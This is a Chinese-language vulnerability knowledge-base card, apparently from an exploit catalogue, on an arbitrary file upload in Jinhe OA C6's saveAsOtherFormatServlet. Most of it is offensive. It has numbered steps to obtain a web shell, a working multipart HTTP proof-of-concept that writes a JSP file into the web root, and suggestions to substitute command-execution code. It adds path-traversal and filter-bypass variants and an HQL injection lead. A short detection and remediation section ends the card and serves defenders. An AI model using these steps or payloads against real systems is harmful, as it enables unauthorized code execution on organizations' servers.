---
id: web-generic-file-upload-jhsoft-saveasotherformatservlet-filename-webshell
title: 金和 OA C6 saveAsOtherFormatServlet 任意文件上传：fileName 参数同时决定路径与文件名，FileBlod 内容原样写入 Web 目录 getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: jhsoft-saveasotherformatservlet-filename-arbitrary-upload
tags:
- web
- file-upload
- jhsoft
- oa
- jsp
- webshell
- filename-control
- arbitrary-write
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V528
  verified_at: '2026-11-11T15:09:43+08:00'
  notes: 已对照原文与25张截图核对：web.xml映射/类名com.jh.jcs.platform.components.ajaxupload.SaveAsOtherFormatServlet、fileName路径拼接、FileBlod写入、img13 200 OK/Apache-Coyote响应均一致。未验证点：原文未贴访问JSP执行截图（卡片已注明），未实测getshell。dedup候选为同产品.NET侧上传，端点/语言栈不同，非重复。原文未给版本号，未设affected_versions。
url: /docs/web/generic/file-upload/web-generic-file-upload-jhsoft-saveasotherformatservlet-filename-webshell/
draft: false
kb_aliases:
- 金和OA saveAsOtherFormatServlet 任意文件上传
- com.jh.jcs.platform.components.ajaxupload.SaveAsOtherFormatServlet
- FileBlod 上传
- 金和 OA getshell
- fileName 文件写入
---

## 一句话结论

金和 OA C6 的 `/jc6/servlet/saveAsOtherFormatServlet` 直接取请求参数 `fileName` 作为落盘文件名，把 multipart 中字段名为 `FileBlod` 的内容原样写入 `Web 根目录 + /upload/gwzw + fileName`；`fileName` 与文件内容都完全可控且无扩展名/类型校验，上传 `.jsp` 即可在 Tomcat 下执行，形成任意文件上传 getshell。

## 原理

- **入口与映射**：`web.xml` 注册 `saveAsOtherFormatServlet`，实现类 `com.jh.jcs.platform.components.ajaxupload.SaveAsOtherFormatServlet`，映射 `/servlet/saveAsOtherFormatServlet`，应用上下文为 `/jc6`。`doGet`/`doPost` 都转给 `processRequest`。
- **文件名来源**：`String fileName = request.getParameter("fileName");`，来自 URL 查询参数，不是 multipart 里的 filename，后续也没有任何扩展名、路径、类型校验。
- **路径计算**：先按 `bizType`（默认「公文正文」）查附件列表；若 `bizType` 不是 `infoContent`，调用 `uploadService.getAttachmentList(bizType, fileName 去掉 .doc/.pdf)`；若查到附件，`docPath` 取第一条附件的文档路径，`realPath = docPath.replace(fileName, "")`；查不到时 `realPath` 置空，走默认分支 `realPath = getServletContext().getRealPath("") + "/upload/gwzw"`，即 Web 应用根目录下的 `upload/gwzw` 目录，不存在则 `mkdirs()` 创建。
- **写入过程**：用 Apache Commons FileUpload 的 `ServletFileUpload.parseRequest` 解析 multipart；遍历 `FileItem`，当字段名等于 `FileBlod` 时执行 `new FileOutputStream(new File(realPath + File.separator + fileName))`，把 `item.get()` 的字节循环写入，最后响应 `OK`。字段名 `FileBlod`（原文代码如此拼写）是关键，其他字段名（`submit_name`、`save_as_pdf`）走不同业务分支。
- **为什么能 getshell**：响应 Server 为 Apache-Coyote/1.1（Tomcat），JSP 由容器解析执行；`fileName=test.jsp` 使文件落在 Web 根目录的 `/upload/gwzw/test.jsp`，可直接访问执行。上传响应 `OK`（Content-Length: 4）即表示写入成功。
- **附带注入点**：`getAttachmentList(bizType, businessId)` 用字符串拼接 HQL（`from TblSysAttachment a where a.bizType = '...' and a.bizId='...'`），`bizType`/`fileName` 可控，原文未演示注入，作为审计线索记录。

## 触发条件

- 目标为金和 OA C6（JSP 版，`/jc6` 上下文存在），`saveAsOtherFormatServlet` 可访问。
- Web 应用对自身目录有写权限，`upload/gwzw` 可创建/写入，容器允许 JSP 解析（默认允许）。
- 请求可携带 multipart 表单，字段名使用 `FileBlod`。
- 原文请求未携带有效 Cookie/会话即返回 200 OK，实际环境是否要求登录需按目标确认。

## 利用步骤

1. 确认目标：访问 `/jc6/servlet/saveAsOtherFormatServlet` 或上传接口特征；响应 Server 含 Apache-Coyote（Tomcat）。
2. 构造 multipart 请求，`fileName` 查询参数设为随机名 `.jsp`（如 `test.jsp`），表单字段名 `FileBlod`，内容为 JSP 代码。
3. 发送请求，服务端在 `WebRoot/upload/gwzw/` 下写入同名文件并返回 `OK`。
4. 访问 `http://target/jc6/upload/gwzw/test.jsp`，页面输出 JSP 执行结果即 getshell；可替换为命令执行、文件管理等等价代码。
5. 若目标已存在同名附件导致 `realPath` 走附件目录分支，可先换随机文件名或先触发默认分支，确保落到 `upload/gwzw`。

## PoC

```http
POST /jc6/servlet/saveAsOtherFormatServlet?fileName=test.jsp HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="FileBlod"; filename="test.jsp"
Content-Type: image/png

<% out.println("123456"); %>
------WebKitFormBoundary--
```

响应：

```text
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Length: 4

OK
```

访问 `http://target/jc6/upload/gwzw/test.jsp` 应输出 `123456`（原文只展示上传返回 OK，未贴访问执行截图；JSP 落 Web 目录即具备执行条件）。

## 变体与关联

- 变体一：`fileName` 含 `../` 时可从 `upload/gwzw` 穿越到其他 Web 子目录或其他可写目录（`new File(realPath + File.separator + fileName)` 未规范化路径），原文未演示。
- 变体二：`bizType=infoContent` 时走另一分支，字段 `save_as_pdf` 将内容存为 `realPath + fileName 的 .doc→.pdf 替换名`，同样由 `fileName` 控制落点，可作为不同字段名的等价利用。
- 变体三：直接改用 `submit_name` 表单字段可覆盖 `fileName`，绕过查询参数被网关过滤的情况。
- 关联：[[web-generic-file-upload-jhsoft-uploadfileeditorsave-path-traversal-asp]]（同产品 .NET 侧任意上传）、[[web-generic-file-inclusion-jhsoft-uploadfiledownloadnew-fcform-traversal]]（同产品文件下载穿越）、[[web-generic-sqli-jhsoft-clobfield-readclob-concat]]、[[web-generic-sqli-jhsoft-getattout-keyid-union]]（同文章同产品 SQL 注入）。
- 边界：`getAttachmentList` 的 HQL 拼接为原文未验证的审计线索；目标若把 `upload/` 目录设为不可执行或非 Tomcat 容器，则 getshell 需换解析方式。

## 检测与防御

- 检测：`saveAsOtherFormatServlet` 请求中 `fileName` 含 `.jsp/.jspx/.war`、路径分隔符或 `..`；multipart 字段名 `FileBlod` 出现在非业务流量；`upload/gwzw` 目录新增脚本文件；上传后紧跟对 `/upload/gwzw/*.jsp` 的访问。
- 修复：`fileName` 服务端生成（UUID + 白名单扩展名），落盘路径固定在上传根目录内并做 `getCanonicalPath` 前缀校验；校验 MIME/文件头；过滤 `..` 与路径分隔符；上传与 Web 目录分离并禁止脚本执行。
- 加固：上传接口加认证与权限控制；WAF 拦截 `FileBlod` 字段携带脚本扩展名；对 `getAttachmentList` 改参数化 HQL/绑定变量。
